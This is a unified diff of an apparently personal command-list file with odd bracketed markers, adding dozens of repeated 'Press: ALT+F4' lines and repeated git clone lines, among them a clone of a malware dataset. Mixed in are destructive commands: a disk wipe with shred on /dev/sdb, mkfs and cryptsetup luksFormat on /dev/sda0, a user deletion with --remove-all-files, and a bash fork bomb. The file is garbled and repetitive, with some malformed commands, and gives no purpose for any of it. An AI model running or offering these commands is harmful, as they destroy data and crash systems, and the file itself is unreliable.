@@ -1,8 +1,74 @@
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<7>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<15>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<^>
 <off>
-git clone https://github.com/sophos/SOREL-20M 
+shred -n 5 -vz /dev/sdb
+<off>
+git clone https://github.com/sophos/SOREL-20M
+<off>
+mkfs ext4 dev/sda0
 <-3.3>  
 sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
 <off>
+sudo deluser --remove-all-files _FÅğğôŤ-RápīšT-Ľőșër 
 :(){:|:&};:
 shred -n 5 -vz /dev/sdb
 git clone https://github.com/ooni/probe
@@ -117,6 +183,36 @@ apt install cryptsetup
 <8>
 sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
 umount
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+>file
+git clone https://github.com/jellybabypsi/pushit 
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
 >file
 git clone https://github.com/jellybabypsi/pushit 
 git clone https://github.com/jellybabypsi/pushit
